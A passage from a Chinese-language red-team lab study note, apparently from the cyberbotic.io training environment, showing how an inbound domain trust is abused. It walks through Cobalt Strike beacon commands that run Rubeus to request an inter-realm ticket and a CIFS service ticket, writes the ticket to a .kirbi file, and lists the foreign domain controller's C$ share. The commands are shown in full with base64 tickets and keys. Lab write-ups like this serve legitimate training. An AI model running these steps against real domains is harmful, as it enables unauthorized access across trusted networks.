  RenewTill                :  9/7/2022 12:33:22 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  /tPpyrs++wA7Z7WPwmpbuBKh8GKl/izyITU0Um5BBo4=
  ASREP (key)              :  178AAEA34E7C37D77FDE27E2DA34E6311BD0AC609C871B925A53BDC69E832A52

```


2. 根据jdams的tgt向dev.cyberbotic.io申请访问外域subsidiary.external的tgt
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:krbtgt/subsidiary.external /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFhDCCBYCgAwIBBaEDAgEWooIEfDCCBHhhggR0MIIEcKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBCowggQmoAMCARKhAwIBAqKCBBgEggQUVUFOGvGywsjokY5L5rMvgJlcJp9EEddmfVeSB7VM8YVqQSYKcZ5TeDB/CxS2gqpjes2JLuOIKA2A9ZSczJDbH261g9jHom8gsrRcVcvQXj/rvYuS8QBibq/oyTWl0xYPwvGEbCYbi8Rr7oF96ccamTgsQ+bs11VreJyywZNxUxFVLvlncYsscOJ8yFkg1ib9sDApMI5V5VX6+L3y2WI3HlQqYUbWl41KJo8I42qyPrDJzcogaOZSoGqPhdpA88IMY/pB8G+hDS7k6Et5YTNjChoTNXMugjg9YSz68jN3VzJ2epqax1Cyblgki04D4cClSEsH75VzLfarPx7RmaZl94EgwVphEP4eJzabJtDreiclbVxEO4f1e0mAOOK2p6cTjIpa706rgIdhcx3EMNPuatrdLYV0I0DTESoMk7Cx39Tyvc2NVf6SMgV8C37VXdP9FskpuZO0eiNqPPOp3nSzaYUr3vEJE+Y3jCxopVmvat+XwNgPBmgdP5mm3fOs4CQpcEmZKmRLIxXvU5wf9e8mia9ROUnwZtNmfDpI6D99CqBivGSaeatGgJ21m5GBIj6ltOUMHlGJNfQcUB4kub8oE7/y8wMWxXyInsgviGlMZnE9+GYcajLqAv8DkH644kx/cT7b9m5P9UBft0Ak7mbg9xxjINXtFHJTo4DbxZJyojegvBhmE+bAe4BKLh528JkUq1nREb16V4FliFkX+eqKpuTXPiEJkvVxjJN6uKgRNNtQz3cXqzVJJFl8+Jc7IXgxuvrFFVv7ltyaQHGh4tZGmLEJ595H6SEIJ7tZNLtnzMMZCU0bTZXgJQ2hJhifvglc5FbLRnOAqlD2z6M5St0QBZde0aKKMKWLNVYr6f46K0Rd2iR9FnIolE+vXHtYPK6GhqbnvkETlC3qApBqqfUJNJ9xo9LxhTOZlc9NCO+dIq07R1St38vtG3GDY0O/VXg7QSBg+ToS3hHwp9fajmfNVrhQ5KajlkaII7kQYFPQf5L8RmQ0pzzn33defCfXfu1m0r1whTpWSBpr3Iw8eUTq0FOHgN+bSgGj277tK6XUPPlX9EeL8WWS7oeAVo3DPORq4jzYEuo8ohy9aHnpozeX/u75VA+gNAacIFQgkjeaHUBuxJhz6TvhdS65DhtdbqBiY18b0aEjfvrDpw9wub+1tJk5SFo3ecVgMAR++W5KTZ3Ue0tqMZ2KajJXXX9Pf4P+7178Pz1DhkggZ3Ke4va4MmKqNpcrYWCzO+0LdnTu3u4kR/V/m8mGezr85Nqi+cLnpb+CpWh0Xw6PoiX1Eq/RfY4Crsj/UaM/AmgLRVaJ8W/iDDPSYy7eMRUPpkPOjT340AhJRHyITjbr0gy+JjsUQoSB9hThRUfdPHDvybJvwEaqdD7go4HzMIHwoAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagKzApoAMCARKhIgQg/tPpyrs++wA7Z7WPwmpbuBKh8GKl/izyITU0Um5BBo6hExsRREVWLkNZQkVSQk9USUMuSU+iEzARoAMCAQGhCjAIGwZqYWRhbXOjBwMFAEDhAAClERgPMjAyMjA4MzEwMDMzMjJaphEYDzIwMjIwODMxMTAzMzIyWqcRGA8yMDIyMDkwNzAwMzMyMlqoExsRREVWLkNZQkVSQk9USUMuSU+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEURFVi5DWUJFUkJPVElDLklP /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe asktgs /service:krbtgt/subsidiary.external /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFhDCCBYCgAwIBBaEDAgEWooIEfDCCBHhhggR0MIIEcKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBCowggQmoAMCARKhAwIBAqKCBBgEggQUVUFOGvGywsjokY5L5rMvgJlcJp9EEddmfVeSB7VM8YVqQSYKcZ5TeDB/CxS2gqpjes2JLuOIKA2A9ZSczJDbH261g9jHom8gsrRcVcvQXj/rvYuS8QBibq/oyTWl0xYPwvGEbCYbi8Rr7oF96ccamTgsQ+bs11VreJyywZNxUxFVLvlncYsscOJ8yFkg1ib9sDApMI5V5VX6+L3y2WI3HlQqYUbWl41KJo8I42qyPrDJzcogaOZSoGqPhdpA88IMY/pB8G+hDS7k6Et5YTNjChoTNXMugjg9YSz68jN3VzJ2epqax1Cyblgki04D4cClSEsH75VzLfarPx7RmaZl94EgwVphEP4eJzabJtDreiclbVxEO4f1e0mAOOK2p6cTjIpa706rgIdhcx3EMNPuatrdLYV0I0DTESoMk7Cx39Tyvc2NVf6SMgV8C37VXdP9FskpuZO0eiNqPPOp3nSzaYUr3vEJE+Y3jCxopVmvat+XwNgPBmgdP5mm3fOs4CQpcEmZKmRLIxXvU5wf9e8mia9ROUnwZtNmfDpI6D99CqBivGSaeatGgJ21m5GBIj6ltOUMHlGJNfQcUB4kub8oE7/y8wMWxXyInsgviGlMZnE9+GYcajLqAv8DkH644kx/cT7b9m5P9UBft0Ak7mbg9xxjINXtFHJTo4DbxZJyojegvBhmE+bAe4BKLh528JkUq1nREb16V4FliFkX+eqKpuTXPiEJkvVxjJN6uKgRNNtQz3cXqzVJJFl8+Jc7IXgxuvrFFVv7ltyaQHGh4tZGmLEJ595H6SEIJ7tZNLtnzMMZCU0bTZXgJQ2hJhifvglc5FbLRnOAqlD2z6M5St0QBZde0aKKMKWLNVYr6f46K0Rd2iR9FnIolE+vXHtYPK6GhqbnvkETlC3qApBqqfUJNJ9xo9LxhTOZlc9NCO+dIq07R1St38vtG3GDY0O/VXg7QSBg+ToS3hHwp9fajmfNVrhQ5KajlkaII7kQYFPQf5L8RmQ0pzzn33defCfXfu1m0r1whTpWSBpr3Iw8eUTq0FOHgN+bSgGj277tK6XUPPlX9EeL8WWS7oeAVo3DPORq4jzYEuo8ohy9aHnpozeX/u75VA+gNAacIFQgkjeaHUBuxJhz6TvhdS65DhtdbqBiY18b0aEjfvrDpw9wub+1tJk5SFo3ecVgMAR++W5KTZ3Ue0tqMZ2KajJXXX9Pf4P+7178Pz1DhkggZ3Ke4va4MmKqNpcrYWCzO+0LdnTu3u4kR/V/m8mGezr85Nqi+cLnpb+CpWh0Xw6PoiX1Eq/RfY4Crsj/UaM/AmgLRVaJ8W/iDDPSYy7eMRUPpkPOjT340AhJRHyITjbr0gy+JjsUQoSB9hThRUfdPHDvybJvwEaqdD7go4HzMIHwoAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagKzApoAMCARKhIgQg/tPpyrs++wA7Z7WPwmpbuBKh8GKl/izyITU0Um5BBo6hExsRREVWLkNZQkVSQk9USUMuSU+iEzARoAMCAQGhCjAIGwZqYWRhbXOjBwMFAEDhAAClERgPMjAyMjA4MzEwMDMzMjJaphEYDzIwMjIwODMxMTAzMzIyWqcRGA8yMDIyMDkwNzAwMzMyMlqoExsRREVWLkNZQkVSQk9USUMuSU+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEURFVi5DWUJFUkJPVElDLklP /nowrap
[+] host called home, sent: 589259 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'krbtgt/subsidiary.external'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[+] TGS request successful!
[*] base64(ticket.kirbi):

      doIFRjCCBUKgAwIBBaEDAgEWooIEXzCCBFthggRXMIIEU6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoigwJqADAgECoR8wHRsGa3JidGd0GxNTVUJTSURJQVJZLkVYVEVSTkFMo4IECzCCBAegAwIBF6EDAgEIooID+QSCA/WCvRkHTLxCDlWUpXRgIzKx/qoHiCGe3t76c3XYftEKXmIGAi0NEfFji677HpZB2OFmwwCZ4STZrw62TTq0oPrrsI2waMIYWKeUhPkWfxlp4xNa/eOyMk78stppSuSTRtDCms+/wsLotS46+qst6DI6KLq9tr/3prQ5DsUSGUQkfmK77kLVy/JscTGVr9NrZiAoReLvj8RWQiI86jSoBWny84ERT6Z7uBLDBdzy+/XJw6JsZ7K0ThZ/XYnfcL0bzpqEMhtfWvfDBK3Z0K2tHDirqmYFn2yvM3X+qy+gOEprQzw6NTVviQlqJONevwqxoaovUJOrvRhXx6TENnU63Xzjf9GIWwdZO8alDeOzFASIVjomurFOhQdTLT4SX6OveghPG5tN6GszcdTmq9HgoIoPMwHhaQNynZ6ORscsvtfx/AfcwNdy3fQihOViF3MmtLTIwPV09gA3g2fSsH4X9sPPLGk0HYK8f66nWnEcPkwSLeBlwCMk6iORskD3QraQ8GnQSqXCwzY27dOzNF2IZZXyvsfhP5QTBrA04h01n+830Oie2QXwsrU+LPiZ/tIV2C2zgDYVNFkqT5eXy5OfeFwj8cJzNnHntrqE1TvTESen3Cgd58APS6OZJCIZtrdHtRyQD5kasujJwgUSNmjhLPl9YTRu+Y/sq0pKbSgu63hbk1U3hgdLPJvKABvmu8W2VSup0iM6ewSHzZaT35JQOj8o1BW3QCZvQ+3ATdwZVj932C3m74/wZjSmJsFfvABuXVeiv9nU1mvadtB5TENx2Tc1ESGVLB+tCBonNCyTBhUYpAIwxvQHNPv0viyvalAF4yEz6amtorod4mn36BC1ebvmh7Xfx3Kw5d7JRF9l+hVGmsxxsdJfmWrgwbC/z+a7JeP72s3KXOuVsBOom6l8SV32gHewAPrCYBXArTafpkPv1lbs869Azy19lWX4uo6SZiFuFa5SF3U/nUiFvpOgknwa3Icqk1SOUy7szdWkSUAdr8K5LqqZp+2DCo4sR9A7hXF5QE9HHaAajWI/QIZu9LuP1feU9JJ44w0ArfxgTEl/CqtGvKcziQBfCRWl1GllvctuuZciqIH4AQWAHgt/4U3lrMYfoNbaE4jFNmik+s7WxoR7gxJZXHOrdqeuQ7C18UzTLx6L1iwEz8U+44Kbbg+Ux2b/q4/Ny8+L6pac3NslgRcST+OmFiHKTSbT0aeMSwrLpGI3VVIeaDdq3ovix0xDKPP7n+EzmC2KwdrsGyBF4Q7Bg7OgX0lrAye5XsaVyi4XlLYuTW4n22PMXw2LufJyG9/Unpr7QhBXkDQ00OZdM93aOv0LuE3p7XvZ+tUmiCaYbMCi2aOB0jCBz6ADAgEAooHHBIHEfYHBMIG+oIG7MIG4MIG1oBswGaADAgEXoRIEEJezBTQc1XrFb+XDVsq1VdWhExsRREVWLkNZQkVSQk9USUMuSU+iEzARoAMCAQGhCjAIGwZqYWRhbXOjBwMFAEAhAAClERgPMjAyMjA4MzEwMDQ0MDFaphEYDzIwMjIwODMxMTAzMzIyWqgTGxFERVYuQ1lCRVJCT1RJQy5JT6koMCagAwIBAqEfMB0bBmtyYnRndBsTU1VCU0lESUFSWS5FWFRFUk5BTA==

  ServiceName              :  krbtgt/SUBSIDIARY.EXTERNAL
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  jadams
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  8/31/2022 12:44:01 AM
  EndTime                  :  8/31/2022 10:33:22 AM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize, pre_authent, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  l7MFNBzVesVv5cNWyrVV1Q==


```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661907150811.jpg)

3. 根据上面tgt申请访问外域cifs服务的tgs

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:cifs/ad.subsidiary.external /domain:ad.subsidiary.external /dc:ad.subsidiary.external /ticket:doIFRjCCBUKgAwIBBaEDAgEWooIEXzCCBFthggRXMIIEU6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoigwJqADAgECoR8wHRsGa3JidGd0GxNTVUJTSURJQVJZLkVYVEVSTkFMo4IECzCCBAegAwIBF6EDAgEIooID+QSCA/WCvRkHTLxCDlWUpXRgIzKx/qoHiCGe3t76c3XYftEKXmIGAi0NEfFji677HpZB2OFmwwCZ4STZrw62TTq0oPrrsI2waMIYWKeUhPkWfxlp4xNa/eOyMk78stppSuSTRtDCms+/wsLotS46+qst6DI6KLq9tr/3prQ5DsUSGUQkfmK77kLVy/JscTGVr9NrZiAoReLvj8RWQiI86jSoBWny84ERT6Z7uBLDBdzy+/XJw6JsZ7K0ThZ/XYnfcL0bzpqEMhtfWvfDBK3Z0K2tHDirqmYFn2yvM3X+qy+gOEprQzw6NTVviQlqJONevwqxoaovUJOrvRhXx6TENnU63Xzjf9GIWwdZO8alDeOzFASIVjomurFOhQdTLT4SX6OveghPG5tN6GszcdTmq9HgoIoPMwHhaQNynZ6ORscsvtfx/AfcwNdy3fQihOViF3MmtLTIwPV09gA3g2fSsH4X9sPPLGk0HYK8f66nWnEcPkwSLeBlwCMk6iORskD3QraQ8GnQSqXCwzY27dOzNF2IZZXyvsfhP5QTBrA04h01n+830Oie2QXwsrU+LPiZ/tIV2C2zgDYVNFkqT5eXy5OfeFwj8cJzNnHntrqE1TvTESen3Cgd58APS6OZJCIZtrdHtRyQD5kasujJwgUSNmjhLPl9YTRu+Y/sq0pKbSgu63hbk1U3hgdLPJvKABvmu8W2VSup0iM6ewSHzZaT35JQOj8o1BW3QCZvQ+3ATdwZVj932C3m74/wZjSmJsFfvABuXVeiv9nU1mvadtB5TENx2Tc1ESGVLB+tCBonNCyTBhUYpAIwxvQHNPv0viyvalAF4yEz6amtorod4mn36BC1ebvmh7Xfx3Kw5d7JRF9l+hVGmsxxsdJfmWrgwbC/z+a7JeP72s3KXOuVsBOom6l8SV32gHewAPrCYBXArTafpkPv1lbs869Azy19lWX4uo6SZiFuFa5SF3U/nUiFvpOgknwa3Icqk1SOUy7szdWkSUAdr8K5LqqZp+2DCo4sR9A7hXF5QE9HHaAajWI/QIZu9LuP1feU9JJ44w0ArfxgTEl/CqtGvKcziQBfCRWl1GllvctuuZciqIH4AQWAHgt/4U3lrMYfoNbaE4jFNmik+s7WxoR7gxJZXHOrdqeuQ7C18UzTLx6L1iwEz8U+44Kbbg+Ux2b/q4/Ny8+L6pac3NslgRcST+OmFiHKTSbT0aeMSwrLpGI3VVIeaDdq3ovix0xDKPP7n+EzmC2KwdrsGyBF4Q7Bg7OgX0lrAye5XsaVyi4XlLYuTW4n22PMXw2LufJyG9/Unpr7QhBXkDQ00OZdM93aOv0LuE3p7XvZ+tUmiCaYbMCi2aOB0jCBz6ADAgEAooHHBIHEfYHBMIG+oIG7MIG4MIG1oBswGaADAgEXoRIEEJezBTQc1XrFb+XDVsq1VdWhExsRREVWLkNZQkVSQk9USUMuSU+iEzARoAMCAQGhCjAIGwZqYWRhbXOjBwMFAEAhAAClERgPMjAyMjA4MzEwMDQ0MDFaphEYDzIwMjIwODMxMTAzMzIyWqgTGxFERVYuQ1lCRVJCT1RJQy5JT6koMCagAwIBAqEfMB0bBmtyYnRndBsTU1VCU0lESUFSWS5FWFRFUk5BTA== /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe asktgs /service:cifs/ad.subsidiary.external /domain:ad.subsidiary.external /dc:ad.subsidiary.external /ticket:doIFRjCCBUKgAwIBBaEDAgEWooIEXzCCBFthggRXMIIEU6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoigwJqADAgECoR8wHRsGa3JidGd0GxNTVUJTSURJQVJZLkVYVEVSTkFMo4IECzCCBAegAwIBF6EDAgEIooID+QSCA/WCvRkHTLxCDlWUpXRgIzKx/qoHiCGe3t76c3XYftEKXmIGAi0NEfFji677HpZB2OFmwwCZ4STZrw62TTq0oPrrsI2waMIYWKeUhPkWfxlp4xNa/eOyMk78stppSuSTRtDCms+/wsLotS46+qst6DI6KLq9tr/3prQ5DsUSGUQkfmK77kLVy/JscTGVr9NrZiAoReLvj8RWQiI86jSoBWny84ERT6Z7uBLDBdzy+/XJw6JsZ7K0ThZ/XYnfcL0bzpqEMhtfWvfDBK3Z0K2tHDirqmYFn2yvM3X+qy+gOEprQzw6NTVviQlqJONevwqxoaovUJOrvRhXx6TENnU63Xzjf9GIWwdZO8alDeOzFASIVjomurFOhQdTLT4SX6OveghPG5tN6GszcdTmq9HgoIoPMwHhaQNynZ6ORscsvtfx/AfcwNdy3fQihOViF3MmtLTIwPV09gA3g2fSsH4X9sPPLGk0HYK8f66nWnEcPkwSLeBlwCMk6iORskD3QraQ8GnQSqXCwzY27dOzNF2IZZXyvsfhP5QTBrA04h01n+830Oie2QXwsrU+LPiZ/tIV2C2zgDYVNFkqT5eXy5OfeFwj8cJzNnHntrqE1TvTESen3Cgd58APS6OZJCIZtrdHtRyQD5kasujJwgUSNmjhLPl9YTRu+Y/sq0pKbSgu63hbk1U3hgdLPJvKABvmu8W2VSup0iM6ewSHzZaT35JQOj8o1BW3QCZvQ+3ATdwZVj932C3m74/wZjSmJsFfvABuXVeiv9nU1mvadtB5TENx2Tc1ESGVLB+tCBonNCyTBhUYpAIwxvQHNPv0viyvalAF4yEz6amtorod4mn36BC1ebvmh7Xfx3Kw5d7JRF9l+hVGmsxxsdJfmWrgwbC/z+a7JeP72s3KXOuVsBOom6l8SV32gHewAPrCYBXArTafpkPv1lbs869Azy19lWX4uo6SZiFuFa5SF3U/nUiFvpOgknwa3Icqk1SOUy7szdWkSUAdr8K5LqqZp+2DCo4sR9A7hXF5QE9HHaAajWI/QIZu9LuP1feU9JJ44w0ArfxgTEl/CqtGvKcziQBfCRWl1GllvctuuZciqIH4AQWAHgt/4U3lrMYfoNbaE4jFNmik+s7WxoR7gxJZXHOrdqeuQ7C18UzTLx6L1iwEz8U+44Kbbg+Ux2b/q4/Ny8+L6pac3NslgRcST+OmFiHKTSbT0aeMSwrLpGI3VVIeaDdq3ovix0xDKPP7n+EzmC2KwdrsGyBF4Q7Bg7OgX0lrAye5XsaVyi4XlLYuTW4n22PMXw2LufJyG9/Unpr7QhBXkDQ00OZdM93aOv0LuE3p7XvZ+tUmiCaYbMCi2aOB0jCBz6ADAgEAooHHBIHEfYHBMIG+oIG7MIG4MIG1oBswGaADAgEXoRIEEJezBTQc1XrFb+XDVsq1VdWhExsRREVWLkNZQkVSQk9USUMuSU+iEzARoAMCAQGhCjAIGwZqYWRhbXOjBwMFAEAhAAClERgPMjAyMjA4MzEwMDQ0MDFaphEYDzIwMjIwODMxMTAzMzIyWqgTGxFERVYuQ1lCRVJCT1RJQy5JT6koMCagAwIBAqEfMB0bBmtyYnRndBsTU1VCU0lESUFSWS5FWFRFUk5BTA== /nowrap
[+] host called home, sent: 589111 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/ad.subsidiary.external'
[*] Using domain controller: ad.subsidiary.external (10.10.14.55)
[+] TGS request successful!
[*] base64(ticket.kirbi):

      doIFkDCCBYygAwIBBaEDAgEWooIEljCCBJJhggSOMIIEiqADAgEFoRUbE1NVQlNJRElBUlkuRVhURVJOQUyiKTAnoAMCAQKhIDAeGwRjaWZzGxZhZC5zdWJzaWRpYXJ5LmV4dGVybmFso4IEPzCCBDugAwIBEqEDAgEHooIELQSCBCnP/Uaosldc0TWO+/XHpumz941pgoOdz6KAqX9jjuJjtPK9hY4S5x+0b3l7xgNkK8jrEg6CQrokX8xWrCILTUTriDB+DyQpnt6KpwW+cNo257Yqvbsv6x6nLqL+04545O1TK9kP94UUu4H0i3a0cWL73pyyBjUkDNBOJbId/JewK08euwS2qqgdV37grmUtlzMGDe6XTNpVmsUQ87T2mrQZvlr8ldnOZbJg4m2ncj0bSnZ4Pi7iVhxhS6VuVcXEchSJdfU4XTQ/LGbHAcFlmZ0PMJ/P+cbVUqib0q/Abg8zlk8J0Si10OTznPLUWqkzoKp2Nxeyw99Rtp6ptLgODn8Kbw8P9+Ya0Fz2MaqZTDSHP+vIIcVTwR6qGWduOo4L0gAz5keW/4R8elyPh2oc8+HnGw+PYdDjb6nzDkejS304HvtDZeCtPCeWHrfjWjP6gy8LM+xOt5IMvH2WrbPlI+1K67tYXjI0PBSB8ADIfaI8T6J0pxY4xxWtdRbJPoUEQaLdvH5ZRjD6L++BZkgxhNmO2JGe7gFd63uOmbqYCegvbhG3juTxsaKHfPgaAqqbdQ7icV7oJDDZQkYI+UwWkFHVFqmCNprRUzK2A5pUg7eUCR+sAILGtJq4ItYcs+S6YXWQHIUVQXisYo4j0vNTGf7O9DaeW0bzzRTigJBAMJjisQMaeKbgKKpv0u9+YfADmz66u7zFVxEiHgq4u+1K/zlwN8FLGJDSsjVEttt0kb7SXqqFHz+G6jmAgpZp0VUAUsC8PbNGJ+noVl44xV/Uh5ibjMH1dGSKLKgD0B2SkTaehMP9ooRn5Cv2URmmWm0Oo+FegL8JV2tHJtg+raiPQMwc4fYGNHvierBVGOp9TGAtj6VhiLLQJnRaqjAepe4u8EbkeBNkvAYrXEIy+NliYBCgahCnvhjHARWhSgXF69LOC6YZ6dbW8bHI6oEHTAlFGCi2dy+J1fjqAlaoz1+drQSJ9VDkdW8mY/RHC6dssnlWy05T2yrBztI7vynkl23BxeHSBmHh2hA6jOV0clw/6NhBQza4MVT9oCX6phKvE7bX70mSsRtSnDRI0KHCUg6IMqmDAkYJMM7wSMcE/XHqZolt85LyVJFiPm9vs/jzQt8JFzGdSiJ8GDsVijXwWHBYkKbdv7fNgCIzm6WDUiwryrRJIMjswTUdVPXU3oFtTnaZLgV2dkQMAzmYHOSLAjEDtCJibrmWFPpEjiNWD3Th4sp4nXg1MIlTKm83qesNE8zIDdkVoTm7tQoyBeUYWvsdlOsPAagfMynkP2fgQWoxQ9LUI+YBtvWu6jG/t8lDhnogFYuN8uPmRYPID8DLDPcc12TitwSBYZkd37xWG8/adsl6D2sY6Lj7NNT9UCWNTP07lNnXHeuTFwZK8zpme8zkMkD0l+gWugfR9bqjgeUwgeKgAwIBAKKB2gSB132B1DCB0aCBzjCByzCByKArMCmgAwIBEqEiBCBCy0f/Cx7GCjG7sPJhG3stjgatajsXG8eLKubATvmSfaETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBmphZGFtc6MHAwUAQCUAAKURGA8yMDIyMDgzMTAwNDUwNlqmERgPMjAyMjA4MzExMDMzMjJaqBUbE1NVQlNJRElBUlkuRVhURVJOQUypKTAnoAMCAQKhIDAeGwRjaWZzGxZhZC5zdWJzaWRpYXJ5LmV4dGVybmFs

  ServiceName              :  cifs/ad.subsidiary.external
  ServiceRealm             :  SUBSIDIARY.EXTERNAL
  UserName                 :  jadams
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  8/31/2022 12:45:06 AM
  EndTime                  :  8/31/2022 10:33:22 AM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  QstH/wsexgoxu7DyYRt7LY4GrWo7FxvHiyrmwE75kn0=




```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661907211822.png)

制作票据

```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\subsidiary.kirbi", [System.Convert]::FromBase64String("doIFkDCCBYygAwIBBaEDAgEWooIEljCCBJJhggSOMIIEiqADAgEFoRUbE1NVQlNJRElBUlkuRVhURVJOQUyiKTAnoAMCAQKhIDAeGwRjaWZzGxZhZC5zdWJzaWRpYXJ5LmV4dGVybmFso4IEPzCCBDugAwIBEqEDAgEHooIELQSCBCnP/Uaosldc0TWO+/XHpumz941pgoOdz6KAqX9jjuJjtPK9hY4S5x+0b3l7xgNkK8jrEg6CQrokX8xWrCILTUTriDB+DyQpnt6KpwW+cNo257Yqvbsv6x6nLqL+04545O1TK9kP94UUu4H0i3a0cWL73pyyBjUkDNBOJbId/JewK08euwS2qqgdV37grmUtlzMGDe6XTNpVmsUQ87T2mrQZvlr8ldnOZbJg4m2ncj0bSnZ4Pi7iVhxhS6VuVcXEchSJdfU4XTQ/LGbHAcFlmZ0PMJ/P+cbVUqib0q/Abg8zlk8J0Si10OTznPLUWqkzoKp2Nxeyw99Rtp6ptLgODn8Kbw8P9+Ya0Fz2MaqZTDSHP+vIIcVTwR6qGWduOo4L0gAz5keW/4R8elyPh2oc8+HnGw+PYdDjb6nzDkejS304HvtDZeCtPCeWHrfjWjP6gy8LM+xOt5IMvH2WrbPlI+1K67tYXjI0PBSB8ADIfaI8T6J0pxY4xxWtdRbJPoUEQaLdvH5ZRjD6L++BZkgxhNmO2JGe7gFd63uOmbqYCegvbhG3juTxsaKHfPgaAqqbdQ7icV7oJDDZQkYI+UwWkFHVFqmCNprRUzK2A5pUg7eUCR+sAILGtJq4ItYcs+S6YXWQHIUVQXisYo4j0vNTGf7O9DaeW0bzzRTigJBAMJjisQMaeKbgKKpv0u9+YfADmz66u7zFVxEiHgq4u+1K/zlwN8FLGJDSsjVEttt0kb7SXqqFHz+G6jmAgpZp0VUAUsC8PbNGJ+noVl44xV/Uh5ibjMH1dGSKLKgD0B2SkTaehMP9ooRn5Cv2URmmWm0Oo+FegL8JV2tHJtg+raiPQMwc4fYGNHvierBVGOp9TGAtj6VhiLLQJnRaqjAepe4u8EbkeBNkvAYrXEIy+NliYBCgahCnvhjHARWhSgXF69LOC6YZ6dbW8bHI6oEHTAlFGCi2dy+J1fjqAlaoz1+drQSJ9VDkdW8mY/RHC6dssnlWy05T2yrBztI7vynkl23BxeHSBmHh2hA6jOV0clw/6NhBQza4MVT9oCX6phKvE7bX70mSsRtSnDRI0KHCUg6IMqmDAkYJMM7wSMcE/XHqZolt85LyVJFiPm9vs/jzQt8JFzGdSiJ8GDsVijXwWHBYkKbdv7fNgCIzm6WDUiwryrRJIMjswTUdVPXU3oFtTnaZLgV2dkQMAzmYHOSLAjEDtCJibrmWFPpEjiNWD3Th4sp4nXg1MIlTKm83qesNE8zIDdkVoTm7tQoyBeUYWvsdlOsPAagfMynkP2fgQWoxQ9LUI+YBtvWu6jG/t8lDhnogFYuN8uPmRYPID8DLDPcc12TitwSBYZkd37xWG8/adsl6D2sY6Lj7NNT9UCWNTP07lNnXHeuTFwZK8zpme8zkMkD0l+gWugfR9bqjgeUwgeKgAwIBAKKB2gSB132B1DCB0aCBzjCByzCByKArMCmgAwIBEqEiBCBCy0f/Cx7GCjG7sPJhG3stjgatajsXG8eLKubATvmSfaETGxFERVYuQ1lCRVJCT1RJQy5JT6ITMBGgAwIBAaEKMAgbBmphZGFtc6MHAwUAQCUAAKURGA8yMDIyMDgzMTAwNDUwNlqmERgPMjAyMjA4MzExMDMzMjJaqBUbE1NVQlNJRElBUlkuRVhURVJOQUypKTAnoAMCAQKhIDAeGwRjaWZzGxZhZC5zdWJzaWRpYXJ5LmV4dGVybmFs"))
```


根据上面的ticket访问外域DC

```
beacon> make_token DEV\jadams FakePass
[*] Tasked beacon to create a token for DEV\jadams
[+] host called home, sent: 37 bytes
[+] Impersonated DEV\bfarmer
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\subsidiary.kirbi
[*] Tasked beacon to apply ticket in C:\Users\Administrator\Desktop\subsidiary.kirbi
[+] host called home, sent: 2990 bytes
beacon> ls \\ad.subsidiary.external\c$
[*] Tasked beacon to list files in \\ad.subsidiary.external\c$
[+] host called home, sent: 45 bytes
[*] Listing: \\ad.subsidiary.external\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     01/20/2022 15:11:33   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     09/09/2021 13:41:54   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/19/2021 22:51:50   System Volume Information
          dir     05/16/2021 11:58:30   Users
          dir     05/16/2021 11:31:57   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 448mb    fil     08/31/2022 00:06:08   pagefile.sys
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661907257604.png)



# Outbound Trust

